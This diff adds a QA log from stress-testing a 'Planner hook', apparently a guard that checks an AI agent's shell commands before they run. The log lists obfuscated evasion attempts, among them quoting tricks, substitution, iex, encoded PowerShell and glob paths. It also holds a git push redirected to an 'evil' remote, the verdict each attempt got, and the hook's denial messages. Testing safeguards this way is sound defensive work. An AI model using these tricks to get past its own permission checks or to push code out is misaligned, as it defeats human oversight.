@@ -1,0 +1,106 @@
+== gen-p1 exit 0
+DISAGREE expect=deny-named got=deny nonliteral:backtick "echo x > \"`pwd`/../../open-brain/tests/t.test.ts\" & wait"
+DISAGREE expect=deny-named got=deny nonliteral:star "echo x 2>\"C:/qa-scratch/qa246-rq237-fx-x/open-brain/src/*\" & wait"
+DISAGREE expect=deny-named got=deny nonliteral:dollar "ls\nmv C:/qa-tmp/src.txt \"$PWD/../scripts/s.sh\""
+DISAGREE expect=deny-named got=deny nonliteral:star "ls\necho x >| ../../HOOKS/*"
+DISAGREE expect=deny-named got=deny nonliteral:star "ls\necho x | tee -a C:/qa-tmp/o2.txt ./../../.AGENTS/*"
+DISAGREE expect=deny-named got=deny nonliteral:tilde-user "ls; echo x | tee ~aaron/C:/qa-scratch/qa246-rq237-sib/scripts/s.sh"
+DISAGREE expect=deny-named got=deny nonliteral:backtick "echo x >> `pwd`/C:/qa-scratch/qa246-rq237-fx/.agents/TASKS/INBOX.md"
+DISAGREE expect=deny-named got=deny nonliteral:bracket "false || echo x >| open-brain/src/[ab].ts"
+DISAGREE expect=deny-named got=deny nonliteral:dollar-brace "cat README.md | echo x | tee -a C:/qa-tmp/o2.txt \"${PWD}/C:/qa-scratch/qa246-rq237-fx/.agents/TASKS/task.md\""
+DISAGREE expect=deny-named got=deny nonliteral:tilde "true && echo x | tee -a C:/qa-tmp/o2.txt ~/C:/QA-SCRATCH/qa246-rq237-sib/SCRIPTS/zz/../s.sh"
+DISAGREE expect=deny-named got=deny nonliteral:tilde-user "cp C:/qa-tmp/src.txt ~aaron/C:/qa-scratch/qa246-rq237-fx/.agents/state.json"
+
+summary {"cases":400,"agree":263,"disagree":137,"denyExpected":272,"allowExpected":128,"failuresByClassTag":{"spell:bs-newline":7,"ctx:new:bang":8,"spell:bs-escape":10,"ctx:plain":9,"ctx:subshell":4,"spell:mid-sq":17,"ctx:semi":11,"spell:gitbash":8,"ctx:new:time":7,"ctx:new:timeout":9,"spell:backslash-sep":8,"ctx:new:trailing-comment":9,"ctx:new:for-do":4,"ctx:newline":21,"spell:sq":6,"ctx:new:background":15,"spell:dq":8,"ctx:new:if-then":5,"ctx:new:pipe-out":2,"spell:plain":18,"ctx:or":7,"spell:mid-dq":4,"ctx:new:brace-group":5,"ctx:new:bash-c":4,"nonlit:cmdsub":5,"nonlit:brace":5,"ctx:and":10,"nonlit:tilde":5,"ctx:pipe-in":7,"nonlit:dollar-brace":4,"nonlit:backtick":10,"nonlit:dollar":3,"nonlit:tmpdir":8,"nonlit:star":5,"nonlit:tilde-user":4,"nonlit:bracket":2}}
+== gen-p2 exit 0
+DISAGREE expect=allow got=grant bash "C:/Program Files/GitHub CLI/gh.exe" pr view 5 --comments
+DISAGREE expect=allow got=grant bash "C:/Program Files/GitHub CLI/gh.exe" pr comment 5 --body merge
+DISAGREE expect=allow got=grant bash "C:/Program Files/GitHub CLI/gh.exe" pr status
+DISAGREE expect=allow got=grant bash \gh pr checks 5
+DISAGREE expect=allow got=grant bash "C:/Program Files/GitHub CLI/gh.exe" pr comment 5 --body merge
+DISAGREE expect=allow got=grant bash \gh pr list --label merge
+DISAGREE expect=allow got=grant bash "C:/Program Files/GitHub CLI/gh.exe" pr status
+DISAGREE expect=allow got=grant bash \gh api repos/o/x/pulls
+DISAGREE expect=allow got=grant bash "C:/Program Files/GitHub CLI/gh.exe" pr view 5 --json mergeable
+DISAGREE expect=allow got=grant bash "C:/Program Files/GitHub CLI/gh.exe" pr comment 5 --body merge
+DISAGREE expect=allow got=grant bash "C:/Program Files/GitHub CLI/gh.exe" pr view 5
+
+summary {"cases":380,"merges":260,"nonMerges":120,"agree":337,"disagree":43,"failOpen":0,"failClosed":43,"failuresByTag":{"ref:1":3,"ctx:plain":7,"ref:42":5,"ctx:comment":7,"ref:#7":5,"ref:origin-url":1,"non-merge":29,"word:merge":16,"no-merge-word":13}}
+== gen-p2b exit 0
+DISAGREE expect=allow got=deny bash ("C:/Program Files/Git/cmd/git.exe" -c user.name=q -C . push --atomic origin refs/heads/loop/q docs/z)
+DISAGREE expect=allow got=deny bash git push origin qa/t194-r5-y chore/w -v # pushed
+DISAGREE expect=allow got=deny bash echo a && "C:/Program Files/Git/cmd/git.exe" --git-dir=.git log
+DISAGREE expect=allow got=deny bash for b in 1; do g'it' -C docs push --no-verify origin loop/x; done
+DISAGREE expect=allow got=deny bash "C:/Program Files/Git/cmd/git.exe" log
+DISAGREE expect=allow got=deny bash echo a && git.exe -c core.x=1 push -v origin HEAD:loop/x
+DISAGREE expect=allow got=deny bash (GIT --git-dir=.git pull)
+DISAGREE expect=allow got=deny bash g'it' -c alias.st='status' st
+DISAGREE expect=allow got=deny bash echo a && "C:/Program Files/Git/cmd/git.exe" --git-dir .git merge-base a b
+DISAGREE expect=allow got=deny bash (git.exe --git-dir .git merge-base a b)
+DISAGREE expect=allow got=deny bash g'it' push origin HEAD:loop/x --no-verify # pushed
+
+summary {"cases":316,"agree":282,"disagree":34,"failOpen":0,"failClosed":34,"failuresByTag":{"ctx:keyword":3,"global-opts":19,"non-restricted":12,"ctx:comment":7,"ctx:subshell":13,"new:inline-alias":3,"ctx:plain":5,"ctx:chain-after":3}}
+== gen-p3 exit 0
+DISAGREE expect=deny-named got=deny ps-dyn#9 "$c = 'Set-Content C:/qa-scratch/qa246-rq237-fx/.agents/TASKS/INBOX.md x'; iex $c"
+DISAGREE expect=deny-named got=deny ps-dyn#4 ". { 'x' > C:/qa-scratch/qa246-rq237-fx/.agents/TASKS/INBOX.md }"
+DISAGREE expect=deny-named got=deny ps-dyn#0 "Invoke-Expression \"Set-Content C:/qa-scratch/qa246-rq237-fx/scripts/s.ps1 x\""
+DISAGREE expect=deny-named got=deny ps-dyn#0 "Invoke-Expression \"Set-Content C:/qa-scratch/qa246-rq237-fx/hooks/h.js x\""
+DISAGREE expect=deny-named got=deny ps-dyn#4 ". { 'x' > C:/qa-scratch/qa246-rq237-fx/open-brain/tests/t.ts }"
+DISAGREE expect=deny-named got=deny ps-dyn#1 "iex 'Set-Content C:/qa-scratch/qa246-rq237-fx/package.json x'"
+DISAGREE expect=deny-named got=deny ps-dyn#4 ". { 'x' > C:/qa-scratch/qa246-rq237-fx/scripts/s.ps1 }"
+DISAGREE expect=deny-named got=deny ps-dyn#1 "iex 'Set-Content C:/qa-scratch/qa246-rq237-fx/hooks/h.js x'"
+DISAGREE expect=deny-named got=deny ps-dyn#1 "iex 'Set-Content C:/qa-scratch/qa246-rq237-fx/open-brain/tests/t.ts x'"
+DISAGREE expect=deny-named got=deny ps-dyn#0 "Invoke-Expression \"Set-Content C:/qa-scratch/qa246-rq237-fx/hooks/h.js x\""
+DISAGREE expect=deny-named got=deny ps-dyn#7 "powershell -NoProfile Set-Content C:/qa-scratch/qa246-rq237-fx/hooks/h.js x"
+
+summary {"cases":360,"agree":264,"disagree":96,"failOpen":0,"failClosed":96,"failuresByTag":{"spell:plain":18,"param:positional":22,"noise:-OV":4,"ctx:plain":18,"param:named":28,"name:-LP":10,"param:colon":13,"noise:-WarningAction":4,"name:-LiteralPath":9,"noise:-Force":1,"ctx:splat":24,"spell:backslash":15,"noise:-EA":2,"spell:dotslash":14,"name:-Dest":5,"noise:-ErrorVariable":5,"ctx:newline":10,"spell:sq":7,"noise:-InfA":2,"noise:-OutBuffer":2,"ctx:pipe-out":5,"noise:-Encoding":2,"name:-Path":8,"extra:-ItemType":2,"noise:-OutVariable":4,"noise:-PipelineVariable":1,"spell:dq":9,"extra:-Force":2,"name:-Destination":3,"noise:-WA":2,"extra:-Type":2,"noise:-EV":3,"name:-Pa":3,"ctx:semi":6,"noise:-InformationAction":2,"name:-FilePath":1,"name:-FileP":1,"noise:-ErrorAction":1,"name:-De":1,"noise:-PV":4,"noise:-OB":2,"dyn:7":5,"dyn:4":6,"dyn:1":8,"dyn:9":4,"dyn:0":9,"dyn:5":1}}
+== probe-holes exit 0
+ok   P3 powershell -EncodedCommand -> deny
+ok   P3 [IO.File]::WriteAllText -> deny
+ok   P3 Out-File control -> deny
+ok   P3 Set-Content -Path: control -> deny
+ok   P3 PS `rm` alias (limit text calls rm out of reach) -> deny
+ok   P3 only-if: Set-Content outside -> allow
+ok   P3 only-if: New-Item -Type File outside -> allow
+ok   P3 cwd=open-brain Set-Content src/x.ts -> deny
+ok   LIMIT nesting depth 5 bash -c -> deny
+ok   LIMIT Rename-Item second argument -> allow
+59/64 as the property requires
+
+== probe-holes2 exit 0
+deny  | ["gh","pr","merge","2"]                          | P2 bash `gh pr $'merge' 2`
+deny  | ["gh","pr","merge","2"]                          | P2 bash `gh pr {merge,} 2`
+deny  | ["gh","pr","merge","2"]                          | P2 bash `X=merge; gh pr $X 2`
+deny  | ["gh","pr","merge","2"]                          | P2 bash `gh $(echo pr) merge 2`
+deny  | ["git","merge","feature"]                        | P2b bash `git mer\ge feature`
+deny  | ["git","merge","feature"]                        | P2b bash `git {merge,} feature`
+deny  | ["git","merge","feature"]                        | P2b bash `git \<newline>merge feature`
+deny  | ["git","push","--force","origin","master"]       | P2b bash `git pu\sh --force origin master`
+deny  | ["git","push","origin","loop/x,master"]          | P2b PS `git push origin loop/x,master`
+deny  | ["git","push","origin","loop/x,--force"]         | P2b PS `git push origin loop/x,--force`
+deny  | ["git","-c","remote.origin.url=https://github.com/evil/x","push","origin","loop/x"] | P2b bash `git -c remote.origin.url=https://github.com/evil/x push origin loop/x`
+
+== probe-merge-async exit 0
+deny  `gh pr merge #2` (bash)  fetched=
+deny  `gh pr merge #2` (PowerShell)  fetched=
+deny  `gh pr merge https://github.com/other/repo/pull/3`  fetched=
+allow control `gh pr merge 2`  fetched=melvenac/Self-Improving-Agent/pulls/2 , melvenac/Self-Improving-Agent/pulls/2/files?per_page=100&page=1
+deny  control `gh pr merge --repo other/repo 3`  fetched=
+
+== fail-closed exit 0
+      Planner hook: denied — not statically parseable: script block or brace. The PowerShell command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a command it can fully parse (Bash and PowerShell); anything else is refused as 'not statically parseable'. PowerShell m
+deny  named PS Set-Location then redirect outside
+      Planner hook: denied — planner.md, "Authority" / state changes go through `ob_state` via PowerShell write (C:/qa-tmp/ls.txt (the command line changes directory with cd, pushd or Set-Location and also writes, so where the write lands cannot be determined; split them into two commands)). The hook checks only a command it can fully parse (Bash and PowerShell); anything else is refused as 'not statica
+deny  NONE  PS $env:TEMP target
+      Planner hook: denied — not statically parseable: $ (variable or expression). The PowerShell command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a command it can fully parse (Bash and PowerShell); anything else is refused as 'not statically parseable'. PowerSh
+deny  named Write tool, path with [ ]
+      Planner hook: denied — C:/qa-tmp/a[1].md (contains a glob pattern, so its location cannot be determined) (fail closed). Path: C:/qa-tmp/a[1].md
+allow       control: cd with no write
+      
+allow       control: cd with output to /dev/null
+      
+
+== probe-comma exit 0
+deny  Remove-Item C:/qa-tmp/a.txt,open-brain/src/x.ts
+deny  Set-Content -Path C:/qa-tmp/a.txt,open-brain/src/x.ts -Value x
+
